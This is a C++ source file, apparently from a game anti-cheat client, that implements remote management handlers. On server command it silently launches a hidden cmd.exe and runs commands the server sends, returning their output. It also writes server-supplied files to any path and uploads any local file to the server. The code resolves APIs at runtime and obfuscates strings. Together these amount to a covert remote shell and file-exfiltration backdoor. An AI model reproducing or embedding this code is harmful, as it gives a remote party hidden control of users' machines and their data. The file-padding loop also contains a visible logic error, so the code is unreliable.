#include "../pch.h"
#include <Lightbone/utils.h>
#include "Service/AntiCheatClient.h"
#include "Service/SubServicePackage.h"
#include <filesystem>
#include "ClientImpl.h"

extern std::shared_ptr<CClientImpl> client_;
extern std::shared_ptr<asio2::timer> g_timer;
struct ConsoleProperties {
    std::string console_application;
    std::string working_directory;
    bool inherit_handle = true;
    DWORD console_flags = NORMAL_PRIORITY_CLASS;
    DWORD startup_flags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    WORD show_console = SW_HIDE;
    DWORD timeout = 50;
};
using ConsoleHandler = std::function<void(const std::string&)>;
class Console
{
public:
    Console(ConsoleProperties input_properties)
    {
        WaitForSingleObject = IMPORT(L"kernel32.dll", WaitForSingleObject);
        PeekNamedPipe = IMPORT(L"kernel32.dll", PeekNamedPipe);
        CreatePipe = IMPORT(L"kernel32.dll", CreatePipe);
        CreateProcessA = IMPORT(L"kernel32.dll", CreateProcessA);
        process_properties = input_properties;
#if 1
        startup_info.dwFlags = process_properties.startup_flags;
        startup_info.wShowWindow = process_properties.show_console;
#endif
        security_attrib = { sizeof(SECURITY_ATTRIBUTES), 0, process_properties.inherit_handle };
    }
    ~Console()
    {
        close();
        CloseHandle(process_info.hProcess);
        CloseHandle(process_info.hThread);
        CloseHandle(input_read);
        CloseHandle(input_write);
        CloseHandle(output_read);
        CloseHandle(output_write);
    }

    bool open()
    {
        open_pipe(input_read, input_write);
        open_pipe(output_read, output_write);
        startup_info.hStdOutput = output_write;
        startup_info.hStdError = output_write;
        startup_info.hStdInput = input_read;
        return CreateProcessA(process_properties.console_application.c_str(), nullptr, 0, 0, process_properties.inherit_handle, process_properties.console_flags, 0, process_properties.working_directory.c_str(), &startup_info, &process_info);
    }
    bool close()
    {
        return TerminateProcess(process_info.hProcess, 0);
    }
    bool write(const std::string& input)
    {
        DWORD bytes_written;
        return WriteFile(input_write, input.c_str(), input.length(), &bytes_written, nullptr);
    }
    void read(ConsoleHandler output_handler)
    {
        // Read command output
        read_console(output_handler);
        // Read path
        read_console(output_handler);
    }
    bool alive()
    {
        return WaitForSingleObject(process_info.hProcess, process_properties.timeout) == WAIT_TIMEOUT;
    }
private:
    bool open_pipe(HANDLE& read, HANDLE& write)
    {
        return CreatePipe(&read, &write, &security_attrib, 0);
    }
    void read_console(ConsoleHandler output_handler)
    {
        do {
            output_handler(std::move(read_pipe(output_read)));
        } while (WaitForSingleObject(input_read, process_properties.timeout) == WAIT_OBJECT_0 && WaitForSingleObject(process_info.hProcess, process_properties.timeout) == WAIT_TIMEOUT);
    }
    std::string read_pipe(HANDLE& pipe)
    {
        unsigned long bytes_available;

        std::string output;
        DWORD bytes_of_read = 0;

        if (PeekNamedPipe(pipe, nullptr, 0, nullptr, &bytes_available, nullptr) && bytes_available != 0) {
            output.resize(bytes_available);
            if (!ReadFile(pipe, output.data(), bytes_available, &bytes_of_read, nullptr)) {

            }
        }
        return output;
    }

    decltype(&WaitForSingleObject) WaitForSingleObject;
    decltype(&PeekNamedPipe) PeekNamedPipe;
    decltype(&CreatePipe) CreatePipe;
    decltype(&CreateProcessA) CreateProcessA;

    STARTUPINFOA startup_info{};
    PROCESS_INFORMATION process_info{};
    SECURITY_ATTRIBUTES security_attrib{};
    HANDLE input_read;
    HANDLE input_write;
    HANDLE output_read;
    HANDLE output_write;
    ConsoleProperties process_properties;
};

class CFile
{
public:
    CFile()
    {
        file_handle_ = INVALID_HANDLE_VALUE;
        CreateFileA = IMPORT(L"kernel32.dll", CreateFileA);
        GetFileSize = IMPORT(L"kernel32.dll", GetFileSize);
        FlushFileBuffers = IMPORT(L"kernel32.dll", FlushFileBuffers);
        ReadFile = IMPORT(L"kernel32.dll", ReadFile);
        WriteFile = IMPORT(L"kernel32.dll", WriteFile);
        CloseHandle = IMPORT(L"kernel32.dll", CloseHandle);
        SetFilePointer = IMPORT(L"kernel32.dll", SetFilePointer);
    }

    ~CFile()
    {
        if (file_handle_ != INVALID_HANDLE_VALUE)
            CloseHandle(file_handle_);
    }

    bool create(const std::string& path)
    {
        file_handle_ = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, 0,
            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
        if (file_handle_ != INVALID_HANDLE_VALUE)
        {
            if (CloseHandle(file_handle_))
            {
                file_handle_ = INVALID_HANDLE_VALUE;
                return true;
            }
            else
                return false;
        }
        else
        {
            return false;
        }
        return false;
    }

    bool open_file(const std::string& path, unsigned int mode)
    {
        DWORD access = 0;
        bool r = false;
        switch (mode)
        {
        case 'r':
        {
            access = GENERIC_READ;
            break;
        }
        case 'w':
        {
            access = GENERIC_WRITE;
            break;
        }
        default:
            return r;
        }
        file_handle_ = CreateFileA(path.c_str(), access, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        r = file_handle_ != INVALID_HANDLE_VALUE;

		size_ = std::filesystem::file_size(path);
		if (size_ <= 0)
		{
			LARGE_INTEGER fileSize;
			HANDLE hFile = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hFile != INVALID_HANDLE_VALUE)
			{
				if (GetFileSizeEx(hFile, &fileSize))
				{
					size_ = fileSize.QuadPart;
				}
				CloseHandle(hFile);
			}
		}
        return r;
    }
    std::size_t read(void* buffer, unsigned num_count)
    {
        if (file_handle_ == INVALID_HANDLE_VALUE || buffer == 0)
        {
            return false;
        }

        if (num_count == 0)
        {
            return false;
        }

        unsigned long bytes_of_read = 0;
        if (ReadFile(file_handle_, buffer, num_count, &bytes_of_read, 0))
        {
            return bytes_of_read;
        }
        else
        {
            return 0;
        }
    }

    bool write(const void* buffer, unsigned num_size)
    {
        if (file_handle_ == INVALID_HANDLE_VALUE)
        {
            return false;
        }
        if (num_size == 0)
        {
            return false;
        }
        unsigned long bytes_of_write = 0;
        if (WriteFile(file_handle_, buffer, num_size, &bytes_of_write, 0))
        {
            return true;
        }
        else
        {
            return false;
        }
    }
    void flush()
    {
        if (file_handle_ == INVALID_HANDLE_VALUE)
            return;
        FlushFileBuffers(file_handle_);
    }

    long seek(unsigned off_set, unsigned from)
    {
        long pos = SetFilePointer(file_handle_, off_set, 0, from);
        return pos;
    }

    long seek2end()
    {
        return seek(0, FILE_END);
    }

    long seek2begin()
    {
        return seek(0, FILE_BEGIN);
    }

    std::size_t get_file_size()
	{
        return GetFileSize(file_handle_, NULL);
    }

    decltype(&CreateFileA) CreateFileA;
    decltype(&FlushFileBuffers) FlushFileBuffers;
    decltype(&GetFileSize) GetFileSize;
    decltype(&ReadFile) ReadFile;
    decltype(&WriteFile) WriteFile;
    decltype(&CloseHandle) CloseHandle;
    decltype(&SetFilePointer) SetFilePointer;

    HANDLE file_handle_;
    std::size_t size_;
};
std::unique_ptr<Console> console_ptr;
const unsigned int DEFINE_TIMER_ID(kCmdPipeTimerId);
const unsigned int DEFINE_TIMER_ID(kCmdBindSessionId);
void InitRmc()
{
    client_->package_mgr().register_handler(SPKG_ID_S2C_RMC_CREATE_CMD, [](const RawProtocolImpl& package, const msgpack::v1::object_handle&) {
        if (console_ptr)
        {
            console_ptr.reset();
        }
        char system_dir[MAX_PATH] = { 0 };
        auto GetSystemDirectoryA = IMPORT(L"kernel32.dll", GetSystemDirectoryA);
        GetSystemDirectoryA(system_dir, sizeof(system_dir));
        ConsoleProperties cmd_prop = {
            std::string(system_dir) + xorstr("\\cmd.exe"),
            ".\\"
        };
        console_ptr = std::make_unique<Console>(cmd_prop);
        console_ptr->open();

        RmcProtocolC2SCreateCommandLine resp;
        client_->send(&resp, package.head.session_id);
        client_->stop_timer(kCmdPipeTimerId);
		LOG(__FUNCTION__);
		g_timer->start_timer(kCmdPipeTimerId, std::chrono::milliseconds(10), [session_id = package.head.session_id]() {
            if (!console_ptr)
                return;
            console_ptr->read([session_id](const std::string& text) {
                if (text.size())
                {
                    RmcProtocolC2SEcho resp;
                    resp.text = text;
                    client_->send(&resp, session_id);
                }
            });
        });
    });
    client_->package_mgr().register_handler(SPKG_ID_S2C_RMC_EXECUTE_CMD, [](const RawProtocolImpl& package, const msgpack::v1::object_handle& msg) {
        if (console_ptr)
        {
            console_ptr->write(msg.get().as<RmcProtocolS2CExecuteCommandLine>().cmd + "\n");
        }
    });
    client_->package_mgr().register_handler(SPKG_ID_S2C_RMC_CLOSE_CMD, [](const RawProtocolImpl& package, const msgpack::v1::object_handle&) {
        if (console_ptr)
        {
            console_ptr.reset();
            client_->stop_timer(kCmdPipeTimerId);
        }
    });
    client_->package_mgr().register_handler(SPKG_ID_S2C_RMC_DOWNLOAD_FILE, [](const RawProtocolImpl& package, const msgpack::v1::object_handle& msg) {
        
        auto req = msg.get().as<RmcProtocolS2CDownloadFile>();
        RmcProtocolC2SDownloadFile resp;
        if (req.pos == 0 && req.total_size != 0 && req.piece.empty())
        {
            CFile file;
            if (!file.create(req.path))
            {
                resp.path = req.path;
                resp.status = -1;
                client_->send(&resp, package.head.session_id);
                return;
            }

            if (!file.open_file(req.path, 'w'))
            {
                resp.path = req.path;
                resp.status = -1;
                client_->send(&resp, package.head.session_id);
                return;
            }

            char temp[0x1000] = {};
            for (int i = 0; i < req.total_size; i += sizeof(temp))
            {
                if (i == req.total_size / sizeof(temp))
                {
                    file.write(temp, req.total_size % sizeof(temp));
                }
                else
                {
                    file.write(temp, sizeof(temp));
                }
            }
            resp.status = 1;
            resp.path = req.path;
            resp.pos = 0;
            resp.piece_size = 0x10000;
            client_->send(&resp, package.head.session_id);
        }
        else
        {
            CFile file;
            if (!file.open_file(req.path, 'w'))
            {
                resp.path = req.path;
                resp.status = -1;
                client_->send(&resp, package.head.session_id);
                return;
            }
            file.seek(req.pos, FILE_BEGIN);
            file.write(req.piece.data(), req.piece.size());
            if (req.pos + req.piece.size() < req.total_size)
            {
                resp.status = 2;
                resp.path = req.path;
                resp.pos = req.pos + req.piece.size();
                resp.piece_size = 0x10000;
                client_->send(&resp, package.head.session_id);
            }
            else
            {
                file.flush();
            }
        }
    });

    client_->package_mgr().register_handler(SPKG_ID_S2C_RMC_UPLOAD_FILE, [](const RawProtocolImpl& package, const msgpack::v1::object_handle& msg) {
        auto req = msg.get().as<RmcProtocolS2CUploadFile>();
        RmcProtocolC2SUploadFile resp;
        if (req.status == 0 && req.pos == 0 && req.piece_size == 0)
        {
            CFile file;
            if (!file.open_file(req.path, 'r'))
            {
                resp.status = -1;
                client_->send(&resp, package.head.session_id);
                return;
            }
            
            resp.status = 0;
            resp.path = req.path;
            resp.pos = 0;
            resp.total_size = file.size_;
            client_->send(&resp, package.head.session_id);
            return;
        }

        if (req.status == 1)
        {
            CFile file;
            if (!file.open_file(req.path, 'r'))
            {
                resp.status = -1;
                client_->send(&resp, package.head.session_id);
                return;
            }
            const size_t file_size = file.size_;
            const size_t piece_size = (std::min)(req.piece_size, file_size);
            resp.piece.resize(piece_size);
            file.seek(req.pos, FILE_BEGIN);
            const size_t read_size = file.read(resp.piece.data(), piece_size);
            resp.piece.resize(read_size);

            resp.status = 1;
            resp.pos = req.pos;
            resp.path = req.path;
            resp.total_size = file.size_;
            client_->send(&resp, package.head.session_id);
        }
    });

    client_->package_mgr().register_handler(SPKG_ID_S2C_RMC_ECHO, [](const RawProtocolImpl& package, const msgpack::v1::object_handle& msg) {
        RmcProtocolC2SEcho resp;
        resp.text = msg.get().as<RmcProtocolS2CEcho>().text;
        client_->send(&resp, package.head.session_id);
    });
}